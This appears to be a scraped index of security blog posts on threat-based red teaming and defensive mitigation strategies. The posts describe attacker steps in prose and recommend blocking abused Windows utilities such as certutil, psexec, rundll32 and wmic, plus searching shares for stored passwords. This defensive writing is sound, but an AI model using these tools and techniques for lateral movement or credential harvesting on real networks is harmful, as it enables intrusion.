ATT&CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against the various TTPs. ATT&CK is broken into Tactics, Techniques, and Procedures. Tactics are the tactical goals a threat may use during an operation. Techniques describe the actions threats take to achieve their objectives. Procedures are the technical steps required to perform the action. This provides a classification of all threat actions regardless of the underlying vulnerabilities. Security operations can use this as a roadmap or scorecard to measure the ability to protect, detect, respond, and recover from a threat. Security program development should include the threat during design and development. Organizations should continue to build and manage a comprehensive security program designed to reduce the attack surface; however, must include Blue TTPs that directly impact the threat. Organizations should use red teams to provide threat faithful stimulus to train blue teams or measure security operations as a whole. Simple measurements are often missed in traditional security testing, but are core to red team engagements. Red teaming can provide answers to question like; Questions What ability does a threat have to laterally move throughout a network? What ability does a threat have to escalate privileges? What ability does a threat have to exfiltrate sensitive data? Can a threat degrade, disrupt, deny, or destroy operations? In addition to these simple questions, red teams and blue teams can use the MITRE ATT&CK Framework as a tool to measure blue's ability to defend against threat TTPs.

ISO 27001 2 defines threat as: A potential cause of an incident, that may result in harm of systems and organization NIST 3 defines threat as: Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service. | To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks.","title":"What is a threat?"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-do-threats-succeed","text":"Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack.

Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -> exploit -> profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in un-actionable default or vendor generate logs and alerts. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice?

A phish is sent to a small number of people. The phish contains an excel attachment with a DDE 4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network. Is this scenario reasonable?

This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once. A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming. Definition of Red Teaming Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment. In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole. Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT . Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk. Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate.","title":"A Threat Will\u2026"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#pdrr-protect-detect-respond-recover-coverage","text":"The NIST CyberSecurity Framework 6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to: Describe their current cybersecurity posture; Describe their target state for cybersecurity; Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process; Assess progress toward the target state; Communicate among internal and external stakeholders about cybersecurity risk. The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory. For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components . What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect , Detect , Respond , and Recover against a threat. Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event. Detect \u2013 The Detect function enables the timely discovery of cybersecurity events. Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident. Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident. Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection.

Much of the content is very broad and uses simplified examples. There are literally thousands of extremely cool and interesting ways to limit threat activity; however, I've decided to simplify and focus on those that could have the most significant impact with relatively easy implementation. Enjoy! Topic \u00b6 While much of the world talks of protecting against an Advanced Persistent Threat (APT), in reality nearly all organizations and networks have an extremely hard time protecting against basic (or dare I say novice?) threats. I've been wanting to write a full white paper on the topic, but can't seem to find the time. Rather, I've decided to summarize my experience into a short series. The first in this series provides an introduction divided into three categories: general problem sets, observations, and recommendations. Follow-on post in the series will provide the technical detail (or \"how to\") for each of the recommendations. Background \u00b6 Over the years my team has performed numerous evaluations against a variety of networks. These evaluations attempted to extend beyond the simple enumeration of potential vulnerabilities (i.e. patches, updates and compliance measures) by reviewing the actions of real-world cyber based threats and attacks. Each assisted in determining the true risk associated with actions performed by a knowledgeable and determined threat. Each evaluation focused on these realistic risk profiles rather than focusing on ephemeral vulnerabilities. Threat Synopsis \u00b6 For those unfamiliar with threat operations, I think it is important to annotate the simplified set of threat actions commonly performed in a network prior to identification of problem sets, observations and recommendations. So, what does an example attack path look like? A threat typically gains access to an externally facing system or service (commonly in a DMZ) that is, in most instances, managed by the internal domain (not a true DMZ). The second method of access involves targeting internal client workstations by phishing, web drive-by, or some other form of social engineering. Once a threat has gained initial access, they leverage various lateral movement techniques to traverse the network away from the initial foothold. At this stage, a threat commonly establishes a method for command and control (C2) and persistence. C2 is simply the influence a threat has over a system to which access has been achieved. Persistence is simply a method for re-establishing or regaining access to C2. The established C2 and continued lateral movement enables the discovery of additional systems, interesting files, and potential paths to a target. The target is the information, system, person or process for which the threat is attempting to access. The threat re-evaluates each pivot through the network looking for these items and for methods of privilege escalation. In real-world scenarios, this stage is when the threat finds elevated account credentials stored in a file or pulls tokens and credentials from memory; however, there are also numerous methods for leveraging applications and services to gain elevated access. Threats repeat this process until privileges have been escalated to that of a Domain Administrator (DA) or higher. Once escalation is achieved, the threat most often targets a server, commonly the Domain Controller (DC). The DC communicates with and controls virtually everything within a windows based network. At this stage, the threat often has access to the target and can perform information collection and impacts as desired. In short, it's usually game over for the target. Although this simplification identifies a Windows based network. It is also important to understand that access to a server, DC, or directory services may not be a requirement for access or impact to the target; however, it is more often than not a major enabler. This synopsis simply demonstrates that most threat attack paths follow the same principles of getting in , staying in and acting regardless of the tools, techniques, and procedures (TTPs), or motivators. Problem Sets \u00b6 As IT and security professionals, we must understand that \"security\" isn't what we should strive towards. Our purpose is to enable the objectives, functions, sustainment and success of the businesses and systems we support. Rather than forcing the concepts of \"security\", we should be identifying and communicating how our efforts support those basic business requirements and provide solutions to existing (and potential) problems to business success. In this article, I'm focusing on those security problems in which most IT and security staff directly influence. Although every organization has it's own unique set of problems, there is a clear commonality that all lead to four root causes. Consider This Anyone has the ability to influence any aspect of the organization regardless of their position! Compliance does not equate to security \u00b6 Given the general construct of how a threat's actions might leverage a network's architecture, simply meeting compliance requirements does little to enable the prevention or detection of threat actions. Across the board, compliance has been set as the bar of achievement when, in reality, compliance is the absolute minimum set of controls, policies and procedures that should be enforced. Don't misunderstand the concept. Compliance is absolutely a requirement and does much for the general security posture of a system or network. However, I've tested hundreds of systems and networks that (at least on paper) were fully compliant with their required standard, but failed to adequately protect the business and associated functions/information. Partial implementation of security controls enable a threat \u00b6 Of the compliance measures employed, many are only partially implemented. One example observed in every effort to date are remote management capabilities. Most Windows Firewall requirements state unsolicited inbound connections must be blocked; however, in each evaluation all hosts tested were able to send and receive connections to/from other devices on the network. Although a firewall was installed and active, it allowed connections via multiple ports, protocols and services (PPS). While this is a single example, it emphasizes the methods in which compliance measures are only partially implemented. Tools are only Enablers \u00b6 Another commonality across the board is an over reliance on tools to perform prevention and detection activities. Our industry dedicates large amounts of valuable resources to the development or purchase of systems and software (tools) that provide little value in the overall security of a network. Many of these tools have been in use or development for multiple years and have undergone numerous reviews; however, few have been successful in thwarting real-world threats. In fact, many of the tools deployed to date have been easily bypassed, detected or leveraged by knowledgeable threats. Tools are enablers. They provide a cognizant human with the information required to make an intelligent decision. Policies and Procedural Nightmares \u00b6 Cumbersome policies and procedures elongate the process for implementing timely and effective defensive mitigations. All interviewed system, network and defensive staff identified longstanding issues with receiving approval to implement change and the timeliness of any approvals received. This concern has been relayed throughout the industry for years. If policy and procedures are primary inhibitors to the successful defense of our networks, policy and procedures must be modified to accommodate the need. If detailed, the number of existing problem sets, vulnerabilities, and operational requirements far exceed any realistic ability to read, digest and act in a timely manner. The four problem sets listed above are of high importance as they are the foundation to all other sets. Each organization must begin addressing methods for limiting a threat's actions without increasing complexity, impacting the way in which systems and networks operate by design (user work-flow), or chasing ephemeral vulnerabilities. I'm left asking myself, why would we (the IT and security community) continue down the same ineffective paths, but continuously expect different results? While meeting compliance requirements does have an extremely valuable effect on security, the next section provides recommendations that would benefit any organization far more. Each of the observations and recommendations are the result of many, many efforts. The recommendations can be applied to any and all networks. Some networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Client-to-client communication \u00b6 Clients rarely need to communicate amongst themselves. Over a roughly eighteen-year period and hundreds of various networks, less than a handful of architectures have had requirements for client-to-client communication (most due to application design failures/features). Observations \u00b6 Of the systems and networks evaluated in recent years, none have required client-to-client communications. In fact, most have already implemented some type of host-based firewall. Yet in every network evaluated to date, all have been configured to allow client-to-client communication. Often the systems, network and defensive teams were unaware that such communications were allowed. In other instances administrative functions were identified as reasons for allowing communication. Example: During review, each network staff identifies that host-based firewalls have been implemented; however, initiating a connection to other clients using multiple ports and protocols has always been successful. Most often the staff cite requirements for system and network administration using Server Message Block (SMB), Remote Desktop Protocol (RDP) or another Remote Administration Tool (RAT). In several instances, security tools were also identified as reasoning for allowing client-to-client communications. Note There are multiple methods of allowing communications for administrative purposes only when required and should never be allowed perpetually. Recommendation: Prevent client-to-client communication \u00b6 Simply implement and configure host and network based firewalls, IPTables, Access Control Lists (ACLs), etc. Leverage any and all capabilities of the network and organization. Preventing these communications limits a threat's ability to move freely throughout the network, reduces the likelihood of privileged account discovery, forces an increase in time and effort (more activities and artifacts), and therefore can increase the defender's ability to detect. Note Effective configuration of host based firewalls requires a thorough understanding of what network traffic should occur (what does normal look like?). Server-to-client communication \u00b6 Most client-server designs require a client to request information from a server. Experience has provided few instances where a server should initiate communications to a client. Observations \u00b6 Of the networks evaluated, none have required server-to-client communications. Yet in every network evaluated to date, all have been configured to allow server-to-client communication. A common threat action is to leverage a server's ability to communicate with clients or segments to move through a network. This often allows the threat to access targets or bridge network segments even when segmentation has been properly implemented. Recommendation: Prevent server-to-client communication \u00b6 Assuming the network has prevented client-to-client communications, the only option a threat has is to attempt access to a server. Given this scenario, it is more than feasible to limit a server's ability to initiate communications with a client. This recommendation limits the threat's ability to move from workstation, to a server and back to another workstation. When connections to clients are attempted, those should stand out as indicators of malicious activity. The most common IT staff concern with this implementation is malfunctioning or broken clients. This is a perfect example of where security implementations assist with the overall health of the network. If a client cannot initiate communications with the server, the client has other issues. This should be cause for investigation and correction rather than simply forcing connections from the server. Another common concern is the ability to \"push\" software, updates, etc. from the server. This is another instance where best practices are not being followed. A client should always request from a server. If deploying software or updates, the client should be notified when communicating with the server (via policy, configurations, etc.) and pull the respective requirements. Note In this context, a server is a functional role rather than a type of device. Outbound Server Communications \u00b6 With very few exceptions, servers should never call outside the network. Observations \u00b6 Of the networks evaluated, all have had servers that allow communication with external (non-organizational) systems. This communication allows a threat to exfiltrate data directly from a server in which it has gained access. It also allows data restricted to certain network segments to be moved through a server and out of the network, often without detection. Recommendation: Block outbound server communications \u00b6 There are few instances where a server needs to communicate with a system external to the network. These are exceptions and should be managed to allow only connections to the required external asset or IP and allow only the use of required ports and protocols. All other outbound communications from servers should be blocked. This implementation combined with the limits between clients and server-to-client exponentially increases the difficulty of lateral movement and command and control. Should your internal Domain Controller manage the server in the DMZ? Of course not, but how many organization effectively control communication paths? Cached administrative credentials \u00b6 Cached credential discovery is a common and primary method in which threats escalate privileges. Cached credentials are simply credentials temporarily stored for use by the system in which they reside. When administrative access for the current activity or session ends, the cached credential is no longer required. Observations \u00b6 Of the networks evaluated, all have had cached administrative credentials present. These credentials are stored in memory when system and network administrators perform maintenance functions, when helpdesk personnel perform user support and when a tool is used to perform an automated task. This is a common problem on virtually all networks and the reason why a threat will leverage this functionality. Recommendation: Clear cached administrative credentials \u00b6 Clearing credentials is relatively easy to do, yet is not often done. A few simple registry changes and requiring administrators to reboot (mainly workstations/clients) after using elevated accounts is a great step forward in limiting cached credentials. Also, forcing the use of Remote Desktop Credential Guard and Restricted Admin (see client-to-client above) has proven to be helpful in limitations; however, depending upon function, there may still be cached credentials present. It is recommended to always reboot after administrative functions. Note There are also several methods for injecting invalid credentials into memory for use as indicators. These HoneyTokens can be used as indicators of malicious activity. KRBTGT (Domain Kerberos Account) \u00b6 By now most have heard of Golden Tickets (GT) and Silver Tickets (ST) created via the domain KRBTGT (Domain Kerberos) account's NTLM hash. These tickets can be valid for extremely long periods of time and allow access to domain resources even after administrative credentials have been changed. Observations \u00b6 Although many security professionals understand the GT/ST concept, most standard IT staff either don't know or are unclear on how they work. Many of the organizations evaluated have never reset the KRBTGT account. Of the few that have, many only reset once. This first reset does change the credential; however, the initial reset also creates a \"backup\". Due to this functionality, the KRBTGT account must be reset twice to flush old credentials completely. Only after the second reset are existing Golden and Silver Tickets rendered useless. Recommendation: Reset the KRBTGT Account \u00b6 Reset the KRBTGT account twice within a limited time-frame (36-48 hours apart is recommended) followed by the changing of all administrative credentials. These resets limit a threat's ability to maintain access after credential changes. The administrative credential change is highly recommended and should be required. If the threat has a valid GT they have obtained valid credentials. A new Golden Ticket can be created after the KRBTGT reset if credentials have not been changed (defeating the purpose of the KRBTGT reset). This process should be completed periodically (no less frequently than quarterly). Note Anyone using assets not on the network during the resets (traveling, out of office, etc.) will likely need help authenticating when reconnecting. Sensitive Items \u00b6 Sensitive items include credentials, configuration files, Privacy of Information Act (PIA) data, Intellectual Property, anything close-hold or critical to business operations, etc. Observations \u00b6 In every network evaluated, multiple instances of sensitive items were discovered. Items were found in many different locations to include organizational file shares, personal file shares, workstation directories, server directories, organizational websites and often on external (non-organizational) websites. More often than not, they are available to anyone with access to the network. These items provide the threat either the information for the target or the information required to obtain access to the target. Recommendation: Perform a sensitive items review \u00b6 Perform frequent search and discovery activities for critical items stored across the network and network systems. With the exception of credential storage, there are legitimate reasons for storing information such as configurations, diagrams, business information, etc. on the network. These need special focus to determine where they are stored, who has access and if they have any authenticators or credentials. Challenge: Perform a string search for \"pass\", \"assw\", \"pwd\", \"key\", and \"Type 7\" on the network. You may be amazed at what is discovered. Ports, Protocols, and Services \u00b6 Ports, protocols and services (PPS) are simply the technical means by which networks communicate. Observations \u00b6 In every network evaluated, PPS were not limited to only those required. This applies to internal as much as external communications. Many organizations rely on firewalls to limit specific ports and protocols from external sources; however, they have limited controls on what PPS traverse the internal network. Even when internal firewalls are in place, traffic is often not restricted appropriately. Recommendation: Block and Disable non-required ports, protocols, and services (PPS) \u00b6 Both internal and external systems and network devices should block PPS that aren't required for the network. Limit PPS to only what is required for each specific system. Think of this as \"PPS white-listing\". Does the network have a need for port 5900 to traverse the entire network? Or is there a need for port 5900 to a specific system? Does the network really need IPX/SPX, WPAD, LLMNR, and NetBIOS enabled? Controlling PPS limits a threat's range of capabilities and increases chances of detection. Note Firewalls (network or host based) are listed above as an easy example. Network based firewalls are simply traffic control devices that allow ingress and egress traffic based upon configuration. Host based firewalls do the same for individual hosts. Accounts and privileges \u00b6 Accounts, group memberships, and privileges are primary enablers for most threat actions. Effective management and control greatly limits a threat's ability to execute within a network. Observations \u00b6 Many organizations have user accounts with some level of elevated access, administrative accounts that administer multiple resource types, and groups with specific permissions nested within other groups with higher level permissions. Each of these enable a threat to freely escalate privileges to a level required to meet their objective. Consider this Concept A threat has the ability to elevate a standard user to one of privileged access, elevate a privileged access account to local administrator, and/or elevate local administrator to domain administrator. If a threat has the ability to escalate a standard user account to that of DA, so does every other user on the network. Recommendation 1: Implement separation of accounts and privileges \u00b6 Ensure separation of user, privileged access, and administrator accounts. Also ensure administrative accounts can only administer within its area of responsibility. System administrators should only administer systems and not have access to servers. Server administrators should only be able to administer servers and not have access to workstations. Domain administrators should not have access to administer servers or workstations. Users should be limited to only what is required to perform daily tasks. Standard users often do not require elevated privileges on a daily basis. In rare scenarios where a user needs elevation often, require the use of a secondary account with only the access required and no external communications ability. Likewise, administrators shouldn't be using elevated accounts for daily tasks. As a general rule all elevated accounts should be restricted from external communications (including internet and email). Also, consider having separate dedicated administrative systems with no email client, Internet browser, timecard access, document editing, any external communication, etc. Recommendation 2: Ensure group permissions are appropriately identified and mapped. \u00b6 This recommendation has multiple applications; however, the main focus is nested groups and permissions. Nesting is a common problem in nearly every windows based-network in existence. Is it easier to troubleshoot permissions or give a user membership to a group to solve the problem? We've all been there. Consider this Concept Group 3 has domain access. Group 2 has server access. Group 1 has workstation access. Group 0 are domain users in a specific division. If a member of Group 0 is assigned to Group 1 due to an elevation requirement, the chances of that user being able to escalate to domain administrator (Group 3) are high. This occurs simply because at least one member of Group 1 is likely a member of Group 2, and at least one member of Group 2 is likely a member of Group 3. It may require a bit of work, but these are the paths and nested permissions a threat will leverage to gain elevated access. Recommendation 3: Implement Microsoft Local Administrator Password Solution (LAPS) \u00b6 LAPS provides automated local administrator account management for every computer in Active Directory. A client-side component generates a random password, updates the LAPS password on the Active Directory computer account, and sets the password locally. LAPS configuration is managed through Group Policy which provides the values for password complexity, password length, local account name for password change, password change frequency, etc. Recommendation 4: Rudimentary *nix Two Factor Authentication (2FA) \u00b6 Many organizations have issues with credential reuse and implementation of Two Factor Authentication (2FA) in *nix based systems especially in off-line or closed networks. A very rudimentary but simple implementation of 2FA is the use of ssh key-files. The user generates a key-file that requires a password for use. The system administrator configures the system to require a key and password. The user now must use the password protected key-file to connect and the system password to complete authentication. Account and Event Activity \u00b6 Account and event activity should be major factors in identifying potential issues or threats within a network. Unfortunately, these are often logged but rarely monitored effectively. Observations \u00b6 Account and event activity collection is commonly identified as a compliance item and treated as a box to be checked. Multiple organizations have successfully configured logging and event forwarding and have alerts to match each event. Yet a common issue discovered in every organization to date is the unreasonable number of notifications or alerts received. Defensive staff are unable to follow every thread to a root cause due to time constraints and the vast number of alerts received. If a dedicated defensive team is unable to run every alert to ground, the alerts, logging, and collection has not been appropriately configured and tuned. Recommendation 1: Monitor login failures and successes \u00b6 Short and simple. Multiple fails followed by a success indicates bad things. Many organizations focus on the failures and only respond when a target number of failures occur (i.e. three failed attempts per account or 300 failed attempts total). Consider this Concept A threat has a password discovered via open source intelligence. The account is unknown; however, the password file has a recent date. The threat performs one validation per account for all accounts on the network (or Outlook Web Access or external SharePoint Portal). After twenty attempts one account has the same password and successfully authenticates. This action met neither of the conditions for alerting. Would this action be identified? Recommendation 2: Consider implementing a second instance or dashboard (or properly tuning the primary) \u00b6 Given that most organizations have a compliance requirement to log all events, it is unreasonable to discard all incoming data. It is feasible to tune the primary or a second instance, dashboard, etc. to look specifically for the indicators as described above. Example: The network has been configured to prevent client-to-client communications. If client-to-client communications are attempted, an alert provides notification. !!! Note: The example action should occur for the eight or ten actions common to most threats. Eight or ten possible scenarios are much easier to monitor and maintain and provide a realistic view of potential threats (outsider or insider) within the network. Application Whitelisting \u00b6 Application Whitelisting is the process of identifying approved software, allowing only those applications to run on a system, and blocking all others. Observations \u00b6 Application Whitelisting is extremely useful in securing a network; however, for any organization with a larger footprint, dispersed locations and a diverse set of business requirements; it can be cumbersome to configure and maintain. In addition, many Application Whitelisting tools and techniques have been bypassed or leveraged to execute malicious code and security researchers continue to discover new ways of doing so. Application Whitelisting provides some value to the overall security of a network, but isn't the silver bullet everyone expects. Combined with other recommendations Application Whitelisting provides an exponential increase in time and difficulty to a threat. Recommendation: Application Whitelisting \u00b6 Implement Application Whitelisting only after all of the prior recommendations have been implemented. An interim strategy (until Application Whitelisting can be fully implemented) may be to prevent standard user execution of specific applications such as: arp, at, certutil, cscript, cmd, dsquery, hostname, ipconfig, msbuild, nbtstat, net, netsh, netstat, nslookup, ntdsutil, pcalua, ping, powershell, psexec, reg, regasm, regedit, regedt32, regsvr32, regsvcs, rundll32, set, sc, schtasks, systeminfo, tasklist, tracert, whoami, wmic, wscript, wsmprovhost, etc. Do standard users normally run any of the preceding commands? Should they? Most users do not use these commands. If they do, why? Most organizations have historically focused on prevention (which is why we consistently see networks with a harder exterior and soft chewy center). While prevention is a huge concern, complete protection will never be possible. Although preventative in nature, the major benefit of the listed recommendations is relative ease of detection. Each activity performed outside the baseline should stand out as indicators of malicious activity. My closing recommendation is for all organizations and security professionals to adopt the concept of \"Assumed Breach\" . An Assumed Breach mentality accepts that a network is currently, or will eventually be, compromised. Prepare your networks and business functions as if there's a known or impending threat to the network. I'll expand more on this in future posts. If a standard user was given administrative credentials while sitting at their workstation, what could they do? What did you come up with? Should a user be able to perform those actions?","title":"Threat Mitagation Strategies - Part 1"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#threat-mitigation-strategies-observations-and-recommendations","text":"James Tubberville | January 25, 2018 | Tweet This Post: Full disclosure: This post is heavy on text.

Each evaluation focused on these realistic risk profiles rather than focusing on ephemeral vulnerabilities.","title":"Background"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#threat-synopsis","text":"For those unfamiliar with threat operations, I think it is important to annotate the simplified set of threat actions commonly performed in a network prior to identification of problem sets, observations and recommendations. So, what does an example attack path look like? A threat typically gains access to an externally facing system or service (commonly in a DMZ) that is, in most instances, managed by the internal domain (not a true DMZ). The second method of access involves targeting internal client workstations by phishing, web drive-by, or some other form of social engineering. Once a threat has gained initial access, they leverage various lateral movement techniques to traverse the network away from the initial foothold. At this stage, a threat commonly establishes a method for command and control (C2) and persistence. C2 is simply the influence a threat has over a system to which access has been achieved. Persistence is simply a method for re-establishing or regaining access to C2. The established C2 and continued lateral movement enables the discovery of additional systems, interesting files, and potential paths to a target. The target is the information, system, person or process for which the threat is attempting to access. The threat re-evaluates each pivot through the network looking for these items and for methods of privilege escalation. In real-world scenarios, this stage is when the threat finds elevated account credentials stored in a file or pulls tokens and credentials from memory; however, there are also numerous methods for leveraging applications and services to gain elevated access. Threats repeat this process until privileges have been escalated to that of a Domain Administrator (DA) or higher. Once escalation is achieved, the threat most often targets a server, commonly the Domain Controller (DC). The DC communicates with and controls virtually everything within a windows based network. At this stage, the threat often has access to the target and can perform information collection and impacts as desired. In short, it's usually game over for the target. Although this simplification identifies a Windows based network. It is also important to understand that access to a server, DC, or directory services may not be a requirement for access or impact to the target; however, it is more often than not a major enabler. This synopsis simply demonstrates that most threat attack paths follow the same principles of getting in , staying in and acting regardless of the tools, techniques, and procedures (TTPs), or motivators.","title":"Threat Synopsis"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#problem-sets","text":"As IT and security professionals, we must understand that \"security\" isn't what we should strive towards.

Don't misunderstand the concept. Compliance is absolutely a requirement and does much for the general security posture of a system or network. However, I've tested hundreds of systems and networks that (at least on paper) were fully compliant with their required standard, but failed to adequately protect the business and associated functions/information.","title":"Compliance does not equate to security"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#partial-implementation-of-security-controls-enable-a-threat","text":"Of the compliance measures employed, many are only partially implemented.

If detailed, the number of existing problem sets, vulnerabilities, and operational requirements far exceed any realistic ability to read, digest and act in a timely manner. The four problem sets listed above are of high importance as they are the foundation to all other sets. Each organization must begin addressing methods for limiting a threat's actions without increasing complexity, impacting the way in which systems and networks operate by design (user work-flow), or chasing ephemeral vulnerabilities. I'm left asking myself, why would we (the IT and security community) continue down the same ineffective paths, but continuously expect different results?

An interim strategy (until Application Whitelisting can be fully implemented) may be to prevent standard user execution of specific applications such as: arp, at, certutil, cscript, cmd, dsquery, hostname, ipconfig, msbuild, nbtstat, net, netsh, netstat, nslookup, ntdsutil, pcalua, ping, powershell, psexec, reg, regasm, regedit, regedt32, regsvr32, regsvcs, rundll32, set, sc, schtasks, systeminfo, tasklist, tracert, whoami, wmic, wscript, wsmprovhost, etc. Do standard users normally run any of the preceding commands? Should they? Most users do not use these commands. If they do, why? Most organizations have historically focused on prevention (which is why we consistently see networks with a harder exterior and soft chewy center). While prevention is a huge concern, complete protection will never be possible. Although preventative in nature, the major benefit of the listed recommendations is relative ease of detection. Each activity performed outside the baseline should stand out as indicators of malicious activity. My closing recommendation is for all organizations and security professionals to adopt the concept of \"Assumed Breach\" . An Assumed Breach mentality accepts that a network is currently, or will eventually be, compromised. Prepare your networks and business functions as if there's a known or impending threat to the network. I'll expand more on this in future posts. If a standard user was given administrative credentials while sitting at their workstation, what could they do? What did you come up with? Should a user be able to perform those actions?","title":"Recommendation: Application Whitelisting"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/","text":"Threat Mitigation Strategies: Part 2 \u00b6 James Tubberville | May 15, 2018 | Tweet This Post: The following information was composed by Andrew Chiles (@andrewchiles), Joe Vest (@joevest) and myself (@minis_io) for quick and easy reference. Much of it was pulled together from a variety of sources with attempts to provide references for each. This post is intended to be more of a brain dump rather than a complete technical breakout. As discussed in the Threat Mitigation Strategies Part 1 http://threatexpress.com/2018/01/threat-mitigation-strategies-observations-recommendations/ , there is commonality between the inherent weaknesses and the actions a threat might perform within an information system or network. The following recommendations and informational snippets were derived from many offensive and defensive efforts that continue to support these correlations. Each recommendation and snippet can and very likely should be applied to all networks. Some systems and networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such. Also note the exact syntax and use will vary with the network construct, operating system/version, and legal/regulatory security requirements. Account Management \u00b6 Accounts should have specific roles. General Guidelines Domain Administrators perform management of Windows Active Directory. They do not manage servers or workstations. Server Administrators perform management of servers. They do not manage workstations. Workstation Administrators perform management of workstation. They do not manage servers. Privileged accounts should NOT have external communications (Internet, email, etc.) Standard users should NOT have elevated access (use secondary accounts if required) Adjust Password Policy \u00b6 Adjust password policy to conform to 